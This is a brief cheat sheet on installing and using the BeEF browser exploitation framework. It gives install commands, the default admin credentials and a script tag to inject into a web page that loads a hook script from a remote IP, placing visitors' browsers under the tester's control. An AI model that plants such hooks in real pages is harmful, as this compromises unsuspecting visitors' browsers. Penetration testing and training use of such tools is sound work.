## BeEF-XSS - Browser Exploitation Framework

Install:

```bash
sudo apt install beef-xss 
```

Start:

```bash
sudo beef-xss
```

Stop:

```bash
sudo beef-xss-stop
```

Admin URL:

​	User: beef
​	Pass: password

```html
http://127.0.0.1:3000/ui/panel
```

Inject this code into a page:

```html
<script type=text/javascript src=http://192.168.119.153:3000/hook.js></script>
```

Have the client visit the page and run the script to hook them into the console.

### Exploits

1. Once a client is 'hooked' into BeEF, go into the 'Hooked Browers' panel and find the client.
2. Clicking a host brings up a details page for the browser.  
3. Going to the commands tab shows a list of exploits that can be run.
